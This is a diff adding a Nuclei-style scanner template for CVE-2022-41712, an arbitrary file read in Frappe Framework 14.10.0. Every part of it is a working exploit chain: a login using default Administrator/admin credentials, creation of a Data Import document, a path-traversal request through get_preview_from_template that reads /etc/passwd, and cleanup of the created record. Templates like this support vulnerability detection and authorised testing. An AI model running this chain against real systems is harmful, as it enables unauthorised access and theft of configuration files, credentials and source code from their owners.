@@ -1,0 +1,78 @@
+id: CVE-2022-41712
+info:
+  name: Frappe Framework Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Frappe Framework version 14.10.0 has an arbitrary file read vulnerability. An attacker can use this vulnerability to read source code, database configuration files, etc., leading to a highly insecure state.
+  reference:
+    - https://fluidattacks.com/advisories/kiniza/
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-41712
+
+variables:
+  filePath: "/etc/passwd"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "cmd=login&usr=Administrator&pwd=admin&device=desktop"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"Logged In\""
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - "Set-Cookie: (.+?);"
+        internal: true
+
+  - id: create-template
+    method: POST
+    path:
+      - "/api/method/frappe.desk.form.save.savedocs"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "{{cookie}}"
+    body: |
+      doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Data+Import%22%2C%22name%22%3A%22new-data-import-1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22Administrator%22%2C%22import_type%22%3A%22Insert+New+Records%22%2C%22status%22%3A%22Pending%22%2C%22submit_after_import%22%3A0%2C%22mute_emails%22%3A1%2C%22show_failed_logs%22%3A0%2C%22reference_doctype%22%3A%22User%22%7D&action=Save
+    extractors:
+      - type: json
+        name: docName
+        json:
+          - '.docs[0].name'
+        internal: true
+
+  - id: file-read
+    method: POST
+    path:
+      - "/api/method/frappe.core.doctype.data_import.data_import.get_preview_from_template"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "{{cookie}}"
+    body: "data_import={{docName}}&import_file=../../../../../../../../../../../{{filePath}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?s)root:(x*?):0:0:"
+
+  - id: cleanup
+    method: POST
+    path:
+      - "/api/method/frappe.desk.reportview.delete_items"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "{{cookie}}"
+    body: "items=%5B%22{{docName}}%22%5D&doctype=Data+Import"
